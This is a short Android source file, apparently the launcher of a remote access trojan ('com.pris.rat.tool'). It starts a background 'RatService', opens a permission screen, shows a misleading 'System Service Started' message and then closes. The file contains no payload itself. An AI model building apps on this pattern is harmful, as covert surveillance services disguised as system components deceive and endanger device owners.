package com.pris.rat.tool;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent svc = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        Intent perm = new Intent(this, PermissionActivity.class);
        startActivity(perm);

        Toast.makeText(this, "System Service Started", Toast.LENGTH_LONG).show();
        finish();
    }
}